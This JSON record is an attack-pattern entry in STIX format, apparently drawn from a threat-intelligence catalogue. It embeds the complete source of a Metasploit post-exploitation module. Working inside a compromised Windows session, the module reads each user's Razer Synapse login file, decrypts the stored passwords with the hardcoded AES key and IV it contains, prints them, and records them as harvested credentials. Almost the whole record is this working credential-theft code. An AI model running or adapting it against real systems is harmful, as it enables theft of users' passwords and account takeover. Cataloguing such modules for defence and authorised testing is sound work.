{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6a1ec935-0c38-4c80-a66e-ab382266bba0",
    "created": "2024-08-14T16:33:11.438478Z",
    "modified": "2024-08-14T16:33:11.438482Z",
    "name": "Windows Gather Razer Synapse Password Extraction",
    "description": " This module will enumerate passwords stored by the Razer Synapse client. The encryption key and iv is publicly known. This module will not only extract encrypted password but will also decrypt password using public key. Affects versions earlier than 1.7.15.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/razer_synapse.rb",
            "external_id": "razer_synapse.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pasv/Testing/blob/master/Razer_decode.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Razer Synapse Password Extraction',\n        'Description' => %q{\n          This module will enumerate passwords stored by the Razer Synapse\n          client. The encryption key and iv is publicly known. This module\n          will not only extract encrypted password but will also decrypt\n          password using public key. Affects versions earlier than 1.7.15.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>',\n          'Matt Howard \"pasv\" <themdhoward[at]gmail.com>', # PoC\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>'\n        ],\n        'References' => [\n          [ 'URL', 'http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/' ],\n          [ 'URL', 'https://github.com/pasv/Testing/blob/master/Razer_decode.py' ]\n        ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Platform' => [ 'win' ]\n      )\n    )\n  end\n\n  def is_base64?(str)\n    str.match(%r{^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$}) ? true : false\n  end\n\n  # decrypt password\n  def decrypt(pass)\n    pass = Rex::Text.decode_base64(pass) if is_base64?(pass)\n    cipher = OpenSSL::Cipher.new 'aes-256-cbc'\n    cipher.decrypt\n    cipher.key = 'hcxilkqbbhczfeultgbskdmaunivmfuo'\n    cipher.iv = 'ryojvlzmdalyglrj'\n\n    pass = pass.unpack('m')[0]\n    password = cipher.update pass\n    password << cipher.final\n\n    password\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: opts[:type],\n      username: opts[:user]\n    }\n\n    if opts[:type] == :nonreplayable_hash\n      credential_data[:jtr_format] = 'odf-aes-opencl'\n    end\n\n    credential_data.merge!(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Loop throuhg config, grab user and pass\n  def get_creds(config)\n    creds = []\n\n    return nil if !config.include?('<Version>')\n\n    xml = ::Nokogiri::XML(config)\n    xml.xpath('//SavedCredentials').each do |node|\n      user = node.xpath('Username').text\n      pass = node.xpath('Password').text\n      type = :password\n      begin\n        pass = decrypt(pass)\n      rescue OpenSSL::Cipher::CipherError\n        type = :nonreplayable_hash\n      end\n      creds << {\n        user: user,\n        pass: pass,\n        type: type\n      }\n    end\n\n    creds\n  end\n\n  def razerzone_ip\n    @razerzone_ip ||= Rex::Socket.resolv_to_dotted('www.razerzone.com')\n  end\n\n  # main control method\n  def run\n    grab_user_profiles.each do |user|\n      next unless user['LocalAppData']\n\n      accounts = user['LocalAppData'] + '\\\\Razer\\\\Synapse\\\\Accounts\\\\RazerLoginData.xml'\n      next if !file?(accounts)\n\n      print_status(\"Config found for user #{user['UserName']}\")\n\n      contents = read_file(accounts)\n\n      # read the contents of file\n      creds = get_creds(contents)\n      next if creds.empty?\n\n      creds.each do |c|\n        user = c[:user]\n        pass = c[:pass]\n        type = c[:type]\n\n        print_good(\"Found cred: #{user}:#{pass}\")\n        report_cred(\n          ip: razerzone_ip,\n          port: 443,\n          service_name: 'http',\n          user: user,\n          password: pass,\n          type: type\n        )\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}